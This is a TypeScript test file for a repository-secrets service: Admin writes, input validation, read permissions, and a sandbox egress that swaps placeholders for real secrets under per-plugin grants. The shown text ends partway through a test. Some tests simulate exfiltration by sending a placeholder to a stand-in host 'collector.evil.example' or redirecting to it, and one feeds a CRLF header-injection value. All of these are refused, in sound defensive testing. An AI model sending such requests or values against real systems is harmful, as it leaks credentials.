// Repository secrets end to end in the Worker (docs/features/secrets.md): an Admin's writes through the real routes and
// the real `secret/Put` and `secret/Delete` on the Node host's engine, the shape of names, and a box's requests through
// the egress, on the compose Postgres and Electric. The hosts a box reaches are scripted at the network. Every test
// also searches what was recorded and stored for the value, in every form an echo may take.
import { Action } from "@smthrs/flow"
import { Placeholder } from "@smthrs/secrets"
import { ConfigProvider, Effect, Layer, Option, Redacted } from "effect"
import { SqlClient } from "effect/sql"
import { afterAll, beforeAll, beforeEach, describe, expect, test } from "vitest"
import * as Database from "../../db/Database.ts"
import * as TestDatabase from "../../db/TestDatabase.ts"
import { parseSecretRoute, SECRETS_SHAPE_ROUTE, secretRoute } from "../../src/features/secrets/contract.ts"
import * as Actor from "../Actor.ts"
import * as RegistryEgress from "../branch/RegistryEgress.ts"
import * as Flows from "../Flows.ts"
import { eventually, testFile } from "../test/harness.ts"
import * as SecretsApi from "./Api.vibe"
import * as Keys from "./Keys.vibe"
import * as SandboxEgress from "./SandboxEgress.vibe"
import * as SecretFlows from "./SecretFlows.vibe"
import * as Store from "./Store.vibe"
import {
  admin,
  agent,
  dump,
  engine,
  events,
  KEY,
  leaks,
  member,
  REPO,
  REPO_ID,
  resetSecrets,
  rows,
  secretsHarness,
  VALUE,
} from "./test/harness.ts"

const runtime = testFile("secrets")
let host: Awaited<ReturnType<typeof engine>>
beforeAll(async () => {
  host = await engine(runtime)
})
afterAll(() => host.close())
beforeEach(() => resetSecrets(runtime))

const open = (options: Parameters<typeof secretsHarness>[2] = {}) => secretsHarness(runtime, host.starter, options)

const path = (secret = "STRIPE_KEY") => secretRoute(REPO.owner, REPO.name, secret)

const put = (body: unknown, init: RequestInit = {}) => ({
  method: "PUT",
  headers: { "content-type": "application/json" },
  body: typeof body === "string" ? body : JSON.stringify(body),
  ...init,
})

const json = async (response: Response) => [response.status, await response.json()] as const

describe("PUT and DELETE /api/repos/<owner>/<name>/secrets/<NAME>", () => {
  test("an Admin sets, replaces and deletes a secret; Postgres and the journal hold only ciphertext", async () => {
    const h = await open({ actor: admin })

    expect(await json(await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] })))).toEqual([
      202,
      { name: "STRIPE_KEY" },
    ])
    const [set] = await rows(runtime)
    expect(set).toMatchObject({
      repoId: REPO_ID,
      name: "STRIPE_KEY",
      keyVersion: 1,
      hosts: ["api.stripe.com"],
      methods: null,
      updatedBy: "person-admin",
    })
    expect(set!.ciphertext).not.toContain("SENTINEL")

    expect(
      (await h.fetch(path(), put({ value: `${VALUE}-2`, hosts: ["api.stripe.com", "files.stripe.com"], methods: ["POST"] })))
        .status,
    ).toBe(202)
    const [replaced] = await rows(runtime)
    expect(replaced).toMatchObject({ hosts: ["api.stripe.com", "files.stripe.com"], methods: ["POST"] })
    expect(replaced!.ciphertext).not.toBe(set!.ciphertext)

    expect(await json(await h.fetch(path(), { method: "DELETE" }))).toEqual([202, { name: "STRIPE_KEY" }])
    expect(await rows(runtime)).toEqual([])
    expect((await h.fetch(path(), { method: "DELETE" })).status).toBe(202)

    expect((await events(runtime)).map((event) => [event.action, event.names, event.actorId])).toEqual([
      ["set", ["STRIPE_KEY"], "person-admin"],
      ["replace", ["STRIPE_KEY"], "person-admin"],
      ["delete", ["STRIPE_KEY"], "person-admin"],
      ["delete", ["STRIPE_KEY"], "person-admin"],
    ])
    expect(host.exits.slice(-4).map((exit) => exit._tag)).toEqual(["Success", "Success", "Success", "Success"])
    expect(h.count(SecretsApi.requests, { op: "put", outcome: "putting" })).toBe(2)
    expect(h.count(SecretsApi.requests, { op: "delete", outcome: "deleting" })).toBe(2)

    // The value never reached a table, the flow journal, a log line, a span or a metric.
    expect(leaks(await dump(runtime, host.schema))).toEqual([])
    expect(leaks(await dump(runtime, await scratchName()))).toEqual([])
    expect(leaks(h.recorded(), [VALUE, `${VALUE}-2`])).toEqual([])
  })

  test("a stored value opens only under its own repository and name", async () => {
    const h = await open({ actor: admin })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    const [row] = await rows(runtime)
    const keys = await Effect.runPromise(Keys.make(Redacted.make("0123456789abcdef".repeat(4))))
    const opened = await Effect.runPromise(keys.cipher.open(row!, { id: REPO_ID, name: "STRIPE_KEY", version: 1 }))
    expect(Redacted.value(opened)).toBe(VALUE)
    for (const context of [{ id: "github/acme/other", name: "STRIPE_KEY", version: 1 }, { id: REPO_ID, name: "OTHER", version: 1 }]) {
      expect((await Effect.runPromiseExit(keys.cipher.open(row!, context)))._tag).toBe("Failure")
    }
  })

  test.each([
    ["nobody signed in", null, 401, "authentication"],
    ["a Member", member, 403, "forbidden"],
    ["an agent acting for an Admin", agent, 403, "forbidden"],
  ] as const)("%s can't write a secret", async (_, actor, status, code) => {
    const h = await open({ actor })
    expect(await json(await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] })))).toEqual([status, { code }])
    expect(await json(await h.fetch(path(), { method: "DELETE" }))).toEqual([status, { code }])
    expect(await rows(runtime)).toEqual([])
    expect(leaks(h.recorded())).toEqual([])
  })

  test.each([
    ["a lowercase name", path("stripe_key"), put({ value: VALUE, hosts: ["api.stripe.com"] }), 400, "invalid_name"],
    ["an IP host", path(), put({ value: VALUE, hosts: ["10.0.0.1"] }), 400, "invalid_hosts"],
    ["a wildcard host", path(), put({ value: VALUE, hosts: ["*.stripe.com"] }), 400, "invalid_hosts"],
    ["no host", path(), put({ value: VALUE, hosts: [] }), 400, "invalid_hosts"],
    ["an unknown method", path(), put({ value: VALUE, hosts: ["a.com"], methods: ["TRACE"] }), 400, "invalid_hosts"],
    ["a short value", path(), put({ value: "short", hosts: ["a.com"] }), 400, "too_short"],
    ["a value over 16 KiB", path(), put({ value: "v".repeat(16 * 1024 + 1), hosts: ["a.com"] }), 400, "too_long"],
    ["a value with a line break", path(), put({ value: `${VALUE}\r\nX: 1`, hosts: ["a.com"] }), 400, "control_character"],
    ["a Latin-1 value", path(), put({ value: `${VALUE}é`, hosts: ["a.com"] }), 400, "non_ascii"],
    ["an emoji value", path(), put({ value: `${VALUE}😀`, hosts: ["a.com"] }), 400, "non_ascii"],
    ["a leading space", path(), put({ value: ` ${VALUE}`, hosts: ["a.com"] }), 400, "surrounding_space"],
    ["a trailing space", path(), put({ value: `${VALUE} `, hosts: ["a.com"] }), 400, "surrounding_space"],
    ["a broken surrogate", path(), put({ value: `${VALUE}\ud800`, hosts: ["a.com"] }), 400, "malformed_text"],
    ["a body that isn't JSON", path(), put(`{"value":"${VALUE}"`), 400, "invalid"],
    ["a body with no hosts", path(), put({ value: VALUE }), 400, "invalid"],
    ["a body over 32 KiB", path(), put({ value: VALUE, hosts: ["a.com"], pad: "x".repeat(33 * 1024) }), 413, "too_large"],
    ["a body that isn't UTF-8", path(), { method: "PUT", body: new Uint8Array([0x7b, 0xff, 0xfe, 0x7d]) }, 400, "invalid"],
  ] as const)("%s is refused, and nothing is written or recorded with the value", async (_, route, init, status, code) => {
    const h = await open({ actor: admin })
    expect(await json(await h.fetch(route, init))).toEqual([status, { code }])
    expect(await rows(runtime)).toEqual([])
    expect(await events(runtime)).toEqual([])
    expect(leaks(h.recorded())).toEqual([])
  })

  test("another repository's secrets are not found: a session's role is for its own repository", async () => {
    const h = await open({ actor: admin })
    const other = secretRoute("acme", "other", "STRIPE_KEY")
    expect(await json(await h.fetch(other, put({ value: VALUE, hosts: ["a.com"] })))).toEqual([404, { code: "not_found" }])
    expect(await json(await h.fetch(other, { method: "DELETE" }))).toEqual([404, { code: "not_found" }])
    expect(await rows(runtime)).toEqual([])
  })

  test("another method is 405, and with secrets off every write is 503 off", async () => {
    const h = await open({ actor: admin })
    const response = await h.fetch(path(), { method: "GET" })
    expect([response.status, response.headers.get("allow")]).toEqual([405, "PUT, DELETE"])
    const off = await open({ actor: admin, keys: false })
    expect(await json(await off.fetch(path(), put({ value: VALUE, hosts: ["a.com"] })))).toEqual([503, { code: "off" }])
  })

  test("a flow that can't start is 503 unavailable, and the value is recorded nowhere", async () => {
    const down = Flows.FlowStarter.of({ start: () => Effect.fail(new Flows.StartUnavailable({ errorCode: "do" })) })
    const h = await open({ actor: admin, starter: down })
    expect(await json(await h.fetch(path(), put({ value: VALUE, hosts: ["a.com"] })))).toEqual([503, { code: "unavailable" }])
    expect(await json(await h.fetch(path(), { method: "DELETE" }))).toEqual([503, { code: "unavailable" }])
    const thrown = Flows.FlowStarter.of({ start: () => Effect.die(new Error(`boom ${VALUE}`)) })
    const broken = await open({ actor: admin, starter: thrown })
    expect(await json(await broken.fetch(path(), put({ value: VALUE, hosts: ["a.com"] })))).toEqual([
      503,
      { code: "unavailable" },
    ])
    expect(leaks(h.recorded() + broken.recorded())).toEqual([])
  })

  test("a step run again records its change once", async () => {
    const database = (await runtime.runPromise(Effect.service(TestDatabase.Scratch))).database
    const write = {
      repoId: REPO_ID,
      name: "K",
      ciphertext: "c",
      nonce: "n",
      keyVersion: 1,
      hosts: ["a.com"],
      methods: undefined,
      actorId: "person-admin",
      invocationKey: "step-1",
    }
    const run = <A>(effect: Effect.Effect<A, unknown, any>) => runtime.runPromise(Effect.provide(effect, database) as Effect.Effect<A>)
    expect(await run(Store.put(write))).toBe("set")
    expect(await run(Store.put(write))).toBe("repeat")
    const remove = { repoId: REPO_ID, name: "K", actorId: "person-admin", invocationKey: "step-2" }
    expect(await run(Store.remove(remove))).toBe("deleted")
    expect(await run(Store.remove(remove))).toBe("repeat")
    expect((await events(runtime)).map((event) => event.action)).toEqual(["set", "delete"])
    expect(await run(Store.secrets(REPO_ID))).toEqual([])
  })

  test("a step whose database can't be reached fails as StoreUnavailable, which the engine retries", async () => {
    const unreachable = Database.layer(Effect.succeed(Redacted.make("postgresql://smithers:smithers@127.0.0.1:1/smithers")))
    const { store, erase } = SecretFlows.steps(unreachable)
    const keyed = <A, E>(effect: Effect.Effect<A, E, any>) =>
      Effect.runPromiseExit(Effect.provideService(effect, Action.CurrentInvocationKey, "step-1") as Effect.Effect<A, E>)
    const sealed = { ciphertext: "c", nonce: "n" }
    const put = await keyed(store({ authority: null, repoId: REPO_ID, name: "K", sealed, keyVersion: 1, hosts: ["a.com"], actorId: "p" }))
    const removed = await keyed(erase({ authority: null, repoId: REPO_ID, name: "K", actorId: "p" }))
    for (const exit of [put, removed]) expect(JSON.stringify(exit)).toContain("@smthrs/mvp/secrets/StoreUnavailable")
    expect(SecretFlows.STORE_RETRY).toMatchObject({ expirationMs: 30 * 60_000 })
  })

  test("a step with no invocation key dies rather than record its change twice", async () => {
    const database = (await runtime.runPromise(Effect.service(TestDatabase.Scratch))).database
    const { store, erase } = SecretFlows.steps(database)
    const sealed = { ciphertext: "c", nonce: "n" }
    const exits = [
      await Effect.runPromiseExit(store({ authority: null, repoId: REPO_ID, name: "K", sealed, keyVersion: 1, hosts: ["a.com"], actorId: "p" }) as Effect.Effect<unknown, unknown>),
      await Effect.runPromiseExit(erase({ authority: null, repoId: REPO_ID, name: "K", actorId: "p" }) as Effect.Effect<unknown, unknown>),
    ]
    for (const exit of exits) expect(JSON.stringify(exit)).toContain("NoInvocationKey")
    expect(await rows(runtime)).toEqual([])
  })
})

describe("GET /api/shapes/secrets", () => {
  const values = async (h: Awaited<ReturnType<typeof open>>, query: string, count: number) => {
    const found: Array<Record<string, unknown>> = []
    let at = "offset=-1"
    await eventually(async () => {
      const response = await h.fetch(`${SECRETS_SHAPE_ROUTE}?${query}&${at}`)
      expect(response.status).toBe(200)
      for (const message of (await response.json()) as Array<{ readonly value?: Record<string, unknown> }>) {
        if (message.value !== undefined) found.push(message.value)
      }
      at = `offset=${response.headers.get("electric-offset")}&handle=${response.headers.get("electric-handle")}`
      return found.length >= count
    }, 10_000)
    return found
  }

  test("a Member reads a repository's names, hosts and methods, never the ciphertext", async () => {
    await (await open({ actor: admin })).fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"], methods: ["GET"] }))
    const h = await open({ actor: member })
    const [row] = await values(h, `repo=${REPO_ID.toUpperCase()}`, 1)
    expect(Object.keys(row!).sort()).toEqual(["hosts", "methods", "name", "repo_id", "updated_at"])
    // Electric sends an array column in Postgres' text form.
    expect(row).toMatchObject({ repo_id: REPO_ID, name: "STRIPE_KEY", hosts: "{api.stripe.com}", methods: "{GET}" })
    expect(h.electric[0]!.searchParams.get("columns")).toBe("repo_id,name,hosts,methods,updated_at")
  })

  test("someone signed out or without a role, or naming another repository, gets no rows", async () => {
    await (await open({ actor: admin })).fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    for (const actor of [null, { ...member, role: null }] as const) {
      const h = await open({ actor })
      const response = await h.fetch(`${SECRETS_SHAPE_ROUTE}?offset=-1&repo=${REPO_ID}`)
      expect(response.status).toBe(200)
      expect(((await response.json()) as Array<{ readonly value?: unknown }>).filter((m) => m.value !== undefined)).toEqual([])
      expect(h.electric[0]!.searchParams.get("params[1]")).toBe("")
    }
    for (const query of ["", "&repo=github/acme/other"]) {
      const h = await open({ actor: member })
      expect((await h.fetch(`${SECRETS_SHAPE_ROUTE}?offset=-1${query}`)).status).toBe(200)
      expect(h.electric[0]!.searchParams.get("params[1]")).toBe("")
    }
  })
})

describe("the sandbox egress", () => {
  const guest: SandboxEgress.BranchGuest = { kind: "branch", repoId: REPO_ID, branchId: "branch-1", generation: 3 }
  const seen: Array<{ readonly url: string; readonly headers: Record<string, string>; readonly redirect?: string }> = []
  const upstream: typeof globalThis.fetch = async (input, init) => {
    const request = new Request(input, init)
    seen.push({ url: request.url, headers: Object.fromEntries(request.headers), redirect: init?.redirect })
    const url = new URL(request.url)
    if (url.pathname === "/redirect") {
      return new Response(null, { status: 302, headers: { location: "https://collector.evil.example/" } })
    }
    // An echo service: it answers with what it received.
    return new Response(`you sent ${request.headers.get("authorization")} and ${btoa(request.headers.get("authorization") ?? "")}`)
  }
  beforeEach(() => void (seen.length = 0))

  const placeholderOf = async (h: Awaited<ReturnType<typeof open>>, target: SandboxEgress.Guest = guest) =>
    /^STRIPE_KEY=(.+)$/m.exec(await h.environment(target))![1]!

  test("a box's placeholder reaches its secret's host as the value, and the answer comes back scrubbed", async () => {
    const h = await open({ actor: admin, upstream })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    const placeholder = await placeholderOf(h)
    expect(Placeholder.is(placeholder)).toBe(true)
    expect(await h.environment(guest)).toBe(`STRIPE_KEY=${placeholder}\n`)

    const response = await h.egress(guest)(
      new Request("https://api.stripe.com/v1/charges", { headers: { authorization: `Bearer ${placeholder}` } }),
    )
    const body = await response.text()
    expect(response.status).toBe(200)
    expect(seen[0]!.headers.authorization).toBe(`Bearer ${VALUE}`)
    expect(seen[0]!.redirect).toBe("manual")
    expect(body).toContain(placeholder)
    expect(leaks(body)).toEqual([])
    expect((await events(runtime)).at(-1)).toMatchObject({
      action: "use",
      names: ["STRIPE_KEY"],
      scope: "branch-1:3",
      host: "api.stripe.com",
      method: "GET",
      outcome: "forwarded",
    })
    expect(leaks(h.recorded())).toEqual([])
    expect(leaks(await dump(runtime, await scratchName()))).toEqual([])
  })

  test("a box on a branch whose repository is named in capitals gets that repository's placeholders", async () => {
    const h = await open({ actor: admin, upstream })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
    const box = SandboxEgress.guestOf({ owner: "Acme", name: "Widgets", branchId: guest.branchId }, guest.generation)
    expect(box).toEqual(guest)
    expect(await h.environment(box)).toMatch(/^STRIPE_KEY=smthrs-secret-[0-9a-f]{64}\n$/)
  })

  test("another host, another method, an earlier generation's placeholder and a redirect get no value", async () => {
    const h = await open({ actor: admin, upstream })
    await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"], methods: ["GET"] }))
    const placeholder = await placeholderOf(h)
    const earlier = await placeholderOf(h, { ...guest, generation: 2 })
    expect(earlier).not.toBe(placeholder)
    const box = h.egress(guest)

    const elsewhere = await box(new Request("https://collector.evil.example/", { headers: { "x-key": placeholder } }))
    expect([elsewhere.status, await elsewhere.text()]).toEqual([403, "host_not_allowed"])
    const posted = await box(
      new Request("https://api.stripe.com/", { method: "POST", headers: { authorization: `Bearer ${placeholder}` } }),
    )
    expect([posted.status, await posted.text()]).toEqual([403, "secret_not_allowed"])
    const stale = await box(new Request("https://api.stripe.com/", { headers: { authorization: `Bearer ${earlier}` } }))
    expect([stale.status, await stale.text()]).toEqual([403, "unknown_placeholder"])
    const redirected = await box(
      new Request("https://api.stripe.com/redirect", { headers: { authorization: `Bearer ${placeholder}` } }),
    )
    expect([redirected.status, redirected.headers.get("location")]).toEqual([302, "https://collector.evil.example/"])

    expect(seen.map((request) => new URL(request.url).hostname)).toEqual(["api.stripe.com"])
    expect((await events(runtime)).filter((event) => event.action === "use").map((event) => [event.host, event.outcome]))
      .toEqual([
        ["collector.evil.example", "host_not_allowed"],
        ["api.stripe.com", "secret_not_allowed"],
        ["api.stripe.com", "unknown_placeholder"],
        ["api.stripe.com", "forwarded"],
      ])
  })

  // Decision 0017 §10: an Admin grants each secret to each plugin installation, and the egress narrows to the grant.
  describe("for a plugin installation", () => {
    const OTHER_VALUE = "ghp_SENTINEL other/+=value"
    /** An installation's box: with no `secrets`, one the host bound no grant to. */
    const installation = (
      installationId: string,
      secrets?: ReadonlyArray<string>,
      origins: ReadonlyArray<string> = [],
    ): SandboxEgress.InstallationGuest => ({
      ...guest,
      kind: "installation",
      installationId,
      grant: secrets === undefined ? undefined : { secrets: new Set(secrets), origins: new Set(origins) },
    })
    /** Secrets on, counting every value the cipher opens: none is opened for a request a grant refuses. */
    const watchedKeys = () => {
      const opened: Array<unknown> = []
      const layer = Layer.effect(
        Keys.SecretKeys,
        Effect.map(Keys.make(KEY), (keys) =>
          Option.some({
            ...keys,
            cipher: new Proxy(keys.cipher, {
              get: (target, property, receiver) =>
                property === "open"
                  ? (...args: Parameters<typeof target.open>) => {
                    opened.push(args[1])
                    return target.open(...args)
                  }
                  : Reflect.get(target, property, receiver),
            }),
          })),
      )
      return { layer, opened }
    }
    const stored = async (keys?: Layer.Layer<Keys.SecretKeys>) => {
      const h = await open({ actor: admin, upstream, config: { EGRESS_ALLOW_HOSTS: "api.example.com" }, ...(keys === undefined ? {} : { keys }) })
      await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"] }))
      await h.fetch(path("OTHER_KEY"), put({ value: OTHER_VALUE, hosts: ["api.other.example"] }))
      return h
    }
    const held = async (h: Awaited<ReturnType<typeof open>>, target: SandboxEgress.Guest) =>
      Object.fromEntries((await h.environment(target)).split("\n").filter((line) => line !== "").map((line) => line.split("=")))
    const sent = () => JSON.stringify(seen)

    test("installation B cannot use installation A's granted secret, by A's placeholder or by a grant of its own", async () => {
      const h = await stored()
      const a = installation("plugin-a@1", ["STRIPE_KEY"], ["https://api.stripe.com"])
      const b = installation("plugin-b@1", ["OTHER_KEY"], ["https://api.other.example"])
      // The branch's own box holds both; each installation holds exactly what its grant names.
      expect(Object.keys(await held(h, guest))).toEqual(["OTHER_KEY", "STRIPE_KEY"])
      const [ofA, ofB, ofBranch] = [await held(h, a), await held(h, b), await held(h, guest)]
      expect(Object.keys(ofA)).toEqual(["STRIPE_KEY"])
      expect(Object.keys(ofB)).toEqual(["OTHER_KEY"])
      // No placeholder is shared: not with the branch's box, and not between installations granted the same name.
      const alsoGranted = installation("plugin-b@1", ["STRIPE_KEY"], ["https://api.stripe.com"])
      const ofAlso = await held(h, alsoGranted)
      expect(new Set([ofA.STRIPE_KEY, ofBranch.STRIPE_KEY, ofAlso.STRIPE_KEY]).size).toBe(3)

      // A's box, with A's placeholder, reaches its host with the value.
      const charged = await h.egress(a)(
        new Request("https://api.stripe.com/v1/charges", { headers: { authorization: `Bearer ${ofA.STRIPE_KEY}` } }),
      )
      expect(charged.status).toBe(200)
      expect(seen).toHaveLength(1)
      expect(seen[0]!.headers.authorization).toBe(`Bearer ${VALUE}`)

      // B's box with A's placeholder: the secret's origin is not in B's grant.
      const stolen = await h.egress(b)(
        new Request("https://api.stripe.com/v1/charges", { headers: { authorization: `Bearer ${ofA.STRIPE_KEY}` } }),
      )
      expect([stolen.status, await stolen.text()]).toEqual([403, "origin_not_granted"])
      // B's box with A's placeholder on a host B does reach: unknown there, and never swapped.
      const smuggled = await h.egress(b)(
        new Request("https://api.other.example/echo", { headers: { "x-key": ofA.STRIPE_KEY! } }),
      )
      expect([smuggled.status, await smuggled.text()]).toEqual([403, "unknown_placeholder"])
      // Granted the same secret, B's box still refuses A's placeholder, and the branch's.
      for (const foreign of [ofA.STRIPE_KEY!, ofBranch.STRIPE_KEY!]) {
        const reused = await h.egress(alsoGranted)(
          new Request("https://api.stripe.com/v1/charges", { headers: { authorization: `Bearer ${foreign}` } }),
        )
        expect([reused.status, await reused.text()]).toEqual([403, "unknown_placeholder"])
      }
      // B's own secret still works for B, and nothing but the two honest requests left the egress.
      const own = await h.egress(b)(
        new Request("https://api.other.example/v1", { headers: { authorization: `Bearer ${ofB.OTHER_KEY}` } }),
      )
      expect(own.status).toBe(200)
      expect(seen.map((request) => new URL(request.url).hostname)).toEqual(["api.stripe.com", "api.other.example"])
      expect(seen[1]!.headers.authorization).toBe(`Bearer ${OTHER_VALUE}`)

      // Each decision is recorded under its installation.
      expect((await events(runtime)).filter((event) => event.action === "use").map((event) => [event.scope, event.outcome]))
        .toEqual([
          ["branch-1:3:plugin-a@1", "forwarded"],
          ["branch-1:3:plugin-b@1", "origin_not_granted"],
          ["branch-1:3:plugin-b@1", "unknown_placeholder"],
          ["branch-1:3:plugin-b@1", "unknown_placeholder"],
          ["branch-1:3:plugin-b@1", "unknown_placeholder"],
          ["branch-1:3:plugin-b@1", "forwarded"],
        ])
      expect(leaks(h.recorded(), [VALUE, OTHER_VALUE])).toEqual([])
    })

    test("an installation with no grant binding, or an empty grant, holds no placeholder, reaches no host, and opens no value", async () => {
      const watched = watchedKeys()
      const h = await stored(watched.layer)
      const branchHeld = await held(h, guest)
      const cases: ReadonlyArray<readonly [SandboxEgress.InstallationGuest, string]> = [
        [installation("plugin-u@1"), "grant_missing"],
        [installation("plugin-u@1", [], []), "origin_not_granted"],
      ]
      for (const [ungranted, code] of cases) {
        expect(await h.environment(ungranted)).toBe("")
        const box = h.egress(ungranted)
        // Its secrets' hosts, with any placeholder it could have copied; the registries; the deployment's allowance.
        for (
          const request of [
            new Request("https://api.stripe.com/v1/charges", { headers: { authorization: `Bearer ${branchHeld.STRIPE_KEY}` } }),
            new Request("https://api.other.example/v1"),
            new Request(`https://${RegistryEgress.HOSTS[0]}/left-pad`),
            new Request("https://api.example.com/left-pad"),
          ]
        ) {
          const answer = await box(request)
          expect([answer.status, await answer.text()], request.url).toEqual([403, code])
        }
      }
      expect(seen).toEqual([])
      expect(watched.opened).toEqual([])
      expect(leaks(sent(), [VALUE, OTHER_VALUE])).toEqual([])
      // Each refusal is recorded under the installation, with its typed code.
      expect((await events(runtime)).filter((event) => event.action === "use").map((event) => [event.scope, event.outcome]))
        .toEqual([...Array(4).fill(["branch-1:3:plugin-u@1", "grant_missing"]), ...Array(4).fill(["branch-1:3:plugin-u@1", "origin_not_granted"])])
      // The branch's own box is unchanged: the deployment's allowance and the registries still answer it.
      expect((await h.egress(guest)(new Request("https://api.example.com/left-pad"))).status).toBe(200)
    })

    test("an installation reaches, with no secret, only the exact origins its grant names", async () => {
      const h = await stored()
      const granted = installation("plugin-o@1", [], ["https://hooks.granted.example", "bare.granted.example", "not a host"])
      // A bare host is not an origin: it grants nothing.
      expect(SandboxEgress.reachable(granted, ["api.example.com"])).toEqual(["hooks.granted.example"])
      const box = h.egress(granted)
      expect((await box(new Request("https://hooks.granted.example/ping"))).status).toBe(200)
      // The granted host under another scheme or port, a host granted by name alone, the deployment's allowance and
      // the registries are not this installation's grant.
      for (
        const url of [
          "http://hooks.granted.example/ping",
          "https://hooks.granted.example:8443/ping",
          "https://bare.granted.example/ping",
          "https://api.example.com/left-pad",
          `https://${RegistryEgress.HOSTS[0]}/left-pad`,
        ]
      ) {
        const answer = await box(new Request(url))
        expect([answer.status, await answer.text()], url).toEqual([403, "origin_not_granted"])
      }
      expect(seen.map((request) => request.url)).toEqual(["https://hooks.granted.example/ping"])
      // An http origin is reached only when the grant names http, and never the https one with it.
      const plain = h.egress(installation("plugin-o@1", [], ["http://hooks.granted.example"]))
      expect((await plain(new Request("http://hooks.granted.example/ping"))).status).toBe(200)
      const secure = await plain(new Request("https://hooks.granted.example/ping"))
      expect([secure.status, await secure.text()]).toEqual([403, "origin_not_granted"])
      // A granted origin on another port admits that port only, and the egress itself still refuses the port.
      const ported = h.egress(installation("plugin-o@1", [], ["https://hooks.granted.example:8443"]))
      const byDefault = await ported(new Request("https://hooks.granted.example/ping"))
      expect([byDefault.status, await byDefault.text()]).toEqual([403, "origin_not_granted"])
      const byPort = await ported(new Request("https://hooks.granted.example:8443/ping"))
      expect([byPort.status, await byPort.text()]).toEqual([403, "port_not_allowed"])
      expect(seen.map((request) => request.url)).toEqual(["https://hooks.granted.example/ping", "http://hooks.granted.example/ping"])
    })

    test("a granted secret is held and sent only when the grant also names its binding's https origin, and is never opened otherwise", async () => {
      const watched = watchedKeys()
      const h = await stored(watched.layer)
      const branchHeld = await held(h, guest)
      const charge = (placeholder: string, url = "https://api.stripe.com/v1/charges") =>
        new Request(url, { headers: { authorization: `Bearer ${placeholder}` } })
      // The secret granted, but its binding's origin not: another origin, the host under http, another port, the bare host.
      for (
        const origins of [
          ["https://hooks.granted.example"],
          ["http://api.stripe.com"],
          ["https://api.stripe.com:8443"],
          ["api.stripe.com"],
        ]
      ) {
        const target = installation("plugin-x@1", ["STRIPE_KEY", "OTHER_KEY"], origins)
        // No placeholder is derived for it, so its box holds none.
        expect(await h.environment(target), origins[0]).toBe("")
        // Its own placeholder, had it one, and the branch's: refused at the secret's host before any value is opened.
        const own = await Effect.runPromise(
          Effect.flatMap(Keys.make(KEY), (keys) => keys.minter.derive(SandboxEgress.scopeOf(target), "STRIPE_KEY")),
        )
        for (const placeholder of [own, branchHeld.STRIPE_KEY!]) {
          const answer = await h.egress(target)(charge(placeholder))
          expect([answer.status, await answer.text()], origins[0]).toEqual([403, "origin_not_granted"])
        }
        // On an origin it does reach, the placeholder is unknown: the secret is not in its policy.
        const reached = origins[0]!.startsWith("http") ? `${origins[0]}/v1/charges` : undefined
        if (reached !== undefined) {
          const answer = await h.egress(target)(charge(own, reached))
          expect(answer.status, reached).toBe(403)
          expect(["unknown_placeholder", "port_not_allowed"], reached).toContain(await answer.text())
        }
      }
      expect(seen).toEqual([])
      expect(watched.opened).toEqual([])
      // The origin granted but not the secret: the host is reached with no secret, and its placeholder is unknown.
      const originOnly = installation("plugin-x@1", [], ["https://api.stripe.com"])
      expect(await h.environment(originOnly)).toBe("")
      const unknown = await h.egress(originOnly)(charge(branchHeld.STRIPE_KEY!))
      expect([unknown.status, await unknown.text()]).toEqual([403, "unknown_placeholder"])
      expect(watched.opened).toEqual([])
      // Both granted: held, and opened exactly once, for the one request that uses it.
      const both = installation("plugin-x@1", ["STRIPE_KEY"], ["https://api.stripe.com"])
      const ofBoth = await held(h, both)
      expect(Object.keys(ofBoth)).toEqual(["STRIPE_KEY"])
      expect((await h.egress(both)(charge(ofBoth.STRIPE_KEY!))).status).toBe(200)
      expect(seen.map((request) => [request.url, request.headers.authorization])).toEqual([
        ["https://api.stripe.com/v1/charges", `Bearer ${VALUE}`],
      ])
      expect(watched.opened).toHaveLength(1)
      expect(leaks(h.recorded(), [VALUE, OTHER_VALUE])).toEqual([])
    })

    test("a granted secret keeps its binding's methods", async () => {
      const h = await open({ actor: admin, upstream })
      await h.fetch(path(), put({ value: VALUE, hosts: ["api.stripe.com"], methods: ["GET"] }))
      const target = installation("plugin-m@1", ["STRIPE_KEY"], ["https://api.stripe.com"])
      const placeholder = await placeholderOf(h, target)
      const posted = await h.egress(target)(
        new Request("https://api.stripe.com/v1/charges", { method: "POST", headers: { authorization: `Bearer ${placeholder}` }, body: "{}" }),
      )
      expect([posted.status, await posted.text()]).toEqual([403, "secret_not_allowed"])
      expect(seen).toEqual([])
    })
  })

  test("EGRESS_ALLOW_HOSTS lets a box reach a host with no secret; anything else answers off or unavailable", async () => {
    const config: Record<string, string> = { EGRESS_ALLOW_HOSTS: "api.example.com, not a host" }
    const allowed = await open({ upstream, config })
    delete config.EGRESS_ALLOW_HOSTS
    expect((await allowed.egress(guest)(new Request("https://api.example.com/left-pad"))).status).toBe(200)
    expect(seen).toHaveLength(1)
    const unset = await open({ upstream })
    expect((await unset.egress(guest)(new Request("https://api.example.com/left-pad"))).status).toBe(403)
    expect(seen).toHaveLength(1)

    const off = await open({ upstream, keys: false })
    expect(await off.environment(guest)).toBe("")
    const answer = await off.egress(guest)(new Request("https://registry.npmjs.org/"))
    expect([answer.status, await answer.text()]).toEqual([503, "off"])

    const unreachable = Database.layer(Effect.succeed(Redacted.make("postgresql://smithers:smithers@127.0.0.1:1/smithers")))
    const down = await open({ upstream, database: unreachable })
    const failed = await down.egress(guest)(new Request("https://registry.npmjs.org/"))
    expect([failed.status, await failed.text()]).toEqual([503, "unavailable"])
  })

  test("with secrets on, a box still reaches every package registry, and EGRESS_ALLOW_HOSTS adds to them", async () => {
    const h = await open({ upstream })
    for (const registry of RegistryEgress.HOSTS) {
      expect((await h.egress(guest)(new Request(`https://${registry}/`))).status, registry).toBe(200)
    }
    expect(seen.map((request) => new URL(request.url).hostname)).toEqual([...RegistryEgress.HOSTS])
    const allowed = (value: string) =>
      Effect.runSync(SandboxEgress.allowHosts.parse(ConfigProvider.fromUnknown({ EGRESS_ALLOW_HOSTS: value })))
    expect(allowed("")).toEqual([...RegistryEgress.HOSTS])
